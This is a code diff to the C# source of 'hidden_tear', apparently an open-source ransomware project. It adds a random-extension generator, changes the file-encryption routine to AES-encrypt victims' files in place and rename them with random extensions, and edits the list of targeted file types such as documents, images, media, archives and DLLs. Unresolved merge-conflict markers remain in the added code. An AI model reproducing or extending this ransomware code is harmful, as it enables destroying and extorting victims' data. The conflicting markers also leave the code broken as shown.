@@ -23,23 +23,11 @@
  */
 
 using System;
-using System.Diagnostics;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Security;
 using System.Security.Cryptography;
 using System.IO;
-using System.Net;
-using Microsoft.Win32;
-using System.Runtime.InteropServices;
-using System.Text.RegularExpressions;
-
 
 namespace hidden_tear
 {
@@ -113,10 +101,26 @@ namespace hidden_tear
             return res.ToString();
         }
 
+<<<<<<< HEAD
+=======
+        public string filename_random(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+            StringBuilder res = new StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--)
+            {
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+
+>>>>>>> Random_extension
         //Encrypts single file
         public void EncryptFile(string file, string password)
         {
 
+            string filerandomname = filename_random(6);
             byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
             byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
 
@@ -126,7 +130,7 @@ namespace hidden_tear
             byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
 
             File.WriteAllBytes(file, bytesEncrypted);
-            System.IO.File.Move(file, file+".locked");
+            System.IO.File.Move(file, file + "." + filerandomname);
 
             
             
@@ -140,7 +144,7 @@ namespace hidden_tear
             //extensions to be encrypt
             var validExtensions = new[]
             {
-                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".locked", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php", ".sln", ".dll"
+                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".jpg", ".png", ".mp3", ".mp4", ".pdf", ".docx", ".hwp", ".wav", ".zip", ".wav", ".flac", ".html", ".php", ".sln", ".dll"
             };
 
             string[] files = Directory.GetFiles(location);
